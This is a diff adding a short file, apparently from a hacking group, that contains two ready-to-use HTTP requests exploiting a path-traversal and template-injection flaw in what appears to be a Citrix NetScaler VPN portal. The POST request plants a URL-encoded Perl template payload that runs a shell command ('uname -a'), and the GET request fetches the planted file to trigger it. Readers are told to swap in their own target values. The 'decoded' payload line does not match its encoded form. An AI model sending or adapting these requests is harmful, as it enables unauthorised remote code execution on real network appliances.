@@ -1,0 +1,45 @@
+1. POST Request
+
+POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1
+Host: site.com
+NSC_USER: /../../../../../../netscaler/portal/templates/input your value
+NSC_NONCE: 180
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 180
+
+url=http://example.com&title=input any value&desc=%5b%25%20%74%65%6d%70%6c%61%74%65%2e%6e%65%77%28%27%42%4c%4f%43%4b%27%20%3d%27%70%72%69%6e%74%20%60%75%6e%61%6d%65%20%2d%61%60%27%29%20%25%5d
+
+encode the payload
+url=http://example.com&title=313377&desc=[%template.new('Block' ='print'uname -a'')%]
+
+
+
+
+
+2. GET request
+
+GET /vpn/../vpns/portal/input your value.xml HTTP/1.1
+Host: site.com
+NSC_USER: input your value
+NSC_NONCE: input your value
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 0
+
+if it doesn't work.
+
+YOU must change each value
+
+
+<3 ErrOr SquaD
+
+Legion@BD
